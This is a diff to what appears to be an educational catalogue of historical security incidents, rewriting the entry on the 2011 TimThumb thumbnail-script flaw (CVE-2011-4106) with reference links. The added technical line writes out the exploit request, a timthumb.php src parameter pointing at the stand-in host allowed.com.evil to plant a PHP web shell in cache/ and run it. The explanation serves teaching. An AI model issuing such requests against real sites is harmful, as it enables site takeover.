@@ -74,15 +74,15 @@ Each case has a PNG in [`illustrations/`](illustrations/). Case **#1** uses **tw
 
 | | |
 |---|---|
-| **Illustration** | [`illustrations/hist-03-timthumb-story-720p.png`](illustrations/hist-03-timthumb-story-720p.png) — **TimThumb cache fetch → remote code execution** · `thumb.php` makes small photos; attacker URL `http://allowed.com.evil/x.php` |
+| **Illustration** | [`illustrations/hist-03-timthumb-story-720p.png`](illustrations/hist-03-timthumb-story-720p.png) — **TimThumb 2011 → RCE on WordPress (CVE-2011-4106)** |
 | **CVE-2011-4106 (NVD)** | https://nvd.nist.gov/vuln/detail/CVE-2011-4106 |
 | **Mark Maunder — technical write-up** | https://markmaunder.com/2011/technical-details-and-scripts-of-the-wordpress-timthumb-php-hack/ |
 | **TimThumb 2.0 announcement** | https://www.binarymoon.co.uk/2011/08/timthumb-2/ |
 | **Wordfence — TimThumb ≤ 1.33** | https://www.wordfence.com/threat-intel/vulnerabilities/detail/timthumb-133-remote-file-download |
 
-**Plain language:** A thumbnail helper downloads a “image” from a forged address, saves it where anyone can open it, and the site is compromised.
+**Plain language:** In 2011 a WordPress thumbnail script (`thumb.php` / `timthumb.php` in a theme or plugin) fetched a file that only looked like an image URL. It saved that file in `cache/`. Opening the cached PHP ran a web shell on the blog.
 
-**Technical:** Broken domain whitelist on `src` → remote PHP lands in `cache/` → direct HTTP request executes it (CVE-2011-4106).
+**Technical:** CVE-2011-4106. Request `/wp-content/plugins/…/timthumb.php?src=http://allowed.com.evil/x.php`. The domain allow-list matched a prefix, so TimThumb wrote `x.php` into `cache/`. `GET …/cache/x.php` executed it.
 
 ---
 
